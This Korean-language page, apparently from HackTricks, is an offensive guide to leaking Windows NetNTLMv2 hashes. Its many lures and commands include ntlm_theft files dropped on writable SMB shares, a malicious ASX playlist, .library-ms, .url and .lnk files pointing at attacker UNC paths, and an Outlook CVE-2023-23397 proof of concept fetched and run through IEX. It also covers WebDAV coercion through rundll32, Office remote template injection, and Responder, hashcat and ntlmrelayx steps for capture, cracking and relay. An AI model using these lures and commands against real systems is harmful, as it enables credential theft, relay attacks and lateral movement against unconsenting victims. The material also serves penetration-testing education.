# NTLM creds를 훔칠 수 있는 장소

{{#include ../../banners/hacktricks-training.md}}

**온라인에서 microsoft word 파일을 다운로드하는 것부터 ntlm leak source인 https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md, 그리고 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)까지, [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)의 훌륭한 아이디어를 모두 확인하세요.**

### Writable SMB share + Explorer에서 트리거되는 UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**사용자나 scheduled jobs가 Explorer에서 탐색하는 share에 write할 수 있다면**, metadata가 사용자의 UNC(예: `\\ATTACKER\share`)를 가리키는 파일을 drop하세요. 폴더를 렌더링하면 **implicit SMB authentication**이 트리거되고, listener로 **NetNTLMv2**가 leak됩니다.<sup>[[1]](#references)</sup>

1. **lures 생성** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. 지원)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **쓰기 가능한 공유 폴더에 내려놓기** (피해자가 여는 모든 폴더):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows는 여러 파일에 동시에 접근할 수 있으며, Explorer가 미리 보기하는 모든 항목(`BROWSE TO FOLDER`)에는 클릭이 필요하지 않습니다.

### Windows Media Player playlists (.ASX/.WAX)

대상이 사용자가 제어하는 Windows Media Player playlist를 열거나 미리 보도록 유도할 수 있다면, 항목을 UNC path로 지정하여 Net-NTLMv2를 leak할 수 있습니다. WMP는 참조된 media를 SMB를 통해 가져오려고 시도하며, 암시적으로 authenticate합니다.<sup>[[3]](#references)[[4]](#references)</sup>

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 cracking 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP archive 내부에서 .library-ms 파일을 직접 열 때 안전하지 않게 처리합니다. Library definition이 remote UNC path(예: \\attacker\share)를 가리키는 경우, ZIP 내부의 .library-ms를 단순히 탐색하거나 실행하는 것만으로도 Explorer가 UNC를 열거하고 attacker에게 NTLM authentication을 전송합니다. 이로 인해 offline에서 crack하거나 잠재적으로 relay할 수 있는 NetNTLMv2가 획득됩니다.<sup>[[2]](#references)</sup>

attacker UNC를 가리키는 최소한의 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 위 XML을 사용해 .library-ms 파일을 생성합니다 (사용자의 IP/hostname으로 설정).
- 해당 파일을 압축합니다 (Windows: Send to → Compressed (zipped) folder). 그런 다음 ZIP을 target에게 전달합니다.
- NTLM capture listener를 실행하고 victim이 ZIP 내부에서 .library-ms 파일을 열 때까지 기다립니다.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows는 calendar item의 extended MAPI property인 PidLidReminderFileParameter를 처리했습니다. 해당 property가 UNC path (예: \\attacker\share\alert.wav)를 가리키면 reminder가 실행될 때 Outlook이 SMB share에 접속하여, click 없이 사용자의 Net-NTLMv2를 leak했습니다. 이 문제는 2023년 3월 14일에 patch되었지만, legacy/untouched fleet 및 historical incident response와 관련해 여전히 매우 중요합니다.<sup>[[5]](#references)</sup>

PowerShell (Outlook COM)을 사용한 간단한 exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
리스너 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
참고
- reminder가 trigger될 때 victim은 Outlook for Windows가 실행 중이기만 하면 됩니다.
- 이 leak은 offline cracking 또는 relay에 적합한 Net-NTLMv2를 노출합니다(pass-the-hash는 아님).


### .LNK/.URL icon-based zero-click NTLM leak (CVE-2025-50154 – CVE-2025-24054 우회)

Windows Explorer는 shortcut icons를 자동으로 렌더링합니다. 최근 research에 따르면 UNC-icon shortcuts에 대한 Microsoft의 2025년 4월 patch 이후에도 shortcut target을 UNC path에서 호스팅하고 icon은 local에 유지하면 clicks 없이 NTLM authentication을 trigger할 수 있었습니다(patch bypass에는 CVE-2025-50154가 할당됨). 단순히 folder를 viewing하는 것만으로도 Explorer가 remote target에서 metadata를 retrieve하고, attacker SMB server로 NTLM을 전송합니다.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell을 통한 프로그램 바로 가기 payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery 아이디어
- shortcut을 ZIP에 넣고 victim이 이를 탐색하도록 유도합니다.
- victim이 열어볼 writable share에 shortcut을 배치합니다.
- Explorer가 항목을 preview하도록 같은 폴더에 다른 lure 파일도 함께 배치합니다.

### ExtraData icon path를 통한 No-click .LNK NTLM leak (CVE‑2026‑25185)

Windows는 실행할 때뿐만 아니라 **view/preview** 중에도(icon rendering 시) `.lnk` metadata를 로드합니다. CVE‑2026‑25185는 **ExtraData** block으로 인해 shell이 icon path를 resolve하고 **load 중에** filesystem에 접근하는 parsing path를 보여줍니다. 이 path가 remote인 경우 outbound NTLM을 발생시킵니다.

주요 trigger conditions (`CShellLink::_LoadFromStream`에서 관찰됨):
- ExtraData에 **DARWIN_PROPS** (`0xa0000006`)를 포함합니다(icon update routine으로 진입하기 위한 gate).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)를 `TargetUnicode`가 채워진 상태로 포함합니다.
- loader는 `TargetUnicode`의 environment variable을 확장한 뒤 결과 path에 대해 `PathFileExistsW`를 호출합니다.

`TargetUnicode`가 UNC path(예: `\\attacker\share\icon.ico`)로 resolve되면, shortcut이 포함된 **folder를 보기만 해도** outbound authentication이 발생합니다. 동일한 load path는 **indexing** 및 **AV scanning**으로도 실행될 수 있으므로, 실용적인 no-click leak surface가 됩니다.<sup>[[7]](#references)</sup>

Windows GUI를 사용하지 않고 이러한 structure를 build/inspect할 수 있도록 Research tooling(parser/generator/UI)은 **LnkMeMaybe** project에서 제공됩니다.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie`를 통한 WebDAV auth coercion / credential validation

Native **WebDAV client**를 악용하면 현재 logon session이 임의의 **HTTP/WebDAV** endpoint에 authenticate하도록 강제할 수 있습니다:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
유용한 이유:
- **공격자가 제어하는 WebDAV 서버**를 대상으로 하면, custom client를 배포하지 않고도 **HTTP를 통한 NTLM**을 트리거할 수 있습니다.
- **내부 호스트**를 대상으로 하면, lateral movement를 수행하기 전에 탈취한 자격 증명이 어디에서 허용되는지 조용히 **검증**할 수 있습니다.<sup>[[9]](#references)</sup>
- **SMB egress가 필터링**되었지만 **HTTP/WebDAV**는 여전히 연결 가능한 경우 유용한 대안입니다.

운영 참고 사항:
- 소스 호스트에서 **WebClient** 서비스가 실행 중이어야 합니다.
- `rundll32.exe`는 `davclnt.dll`을 로드하고, Windows가 **현재 사용자의 자격 증명**을 사용해 WebDAV authentication을 처리하도록 합니다.<sup>[[10]](#references)</sup>
- 자신이 제어하는 인프라를 대상으로 지정하는 경우, 다음과 같은 NTLM-aware HTTP listener/relay를 사용합니다:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
탐지 관점에서 여러 내부 시스템을 대상으로 반복 실행되는 `rundll32.exe davclnt.dll,DavSetCookie`는 일반적인 사용자 동작이라기보다 **credential validation / spray-like lateral movement prep**의 강력한 신호입니다.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm)로 NTLM 강제

Office 문서는 외부 템플릿을 참조할 수 있습니다. 연결된 템플릿을 UNC path로 설정하면 문서를 열 때 SMB로 인증합니다.

최소한의 DOCX relationship 변경 사항 (`word/` 내부):

1) `word/settings.xml`을 편집하고 연결된 템플릿 참조를 추가합니다:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels를 편집하고 rId1337이 사용자의 UNC를 가리키도록 설정합니다:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 Repack하여 전달합니다. SMB capture listener를 실행하고 파일이 열릴 때까지 기다립니다.

NTLM을 relay하거나 악용하는 post-capture 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## 참고 자료
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Microsoft의 패치되지 않은 privilege escalation 위협](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft가 Outlook EoP (CVE‑2023‑23397)을 완화하고 PidLidReminderFileParameter를 통한 NTLM leak을 설명](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 리뷰](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT Support Calls: Teams에서 Domain Compromise까지, ModeloRAT Campaign 분석](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
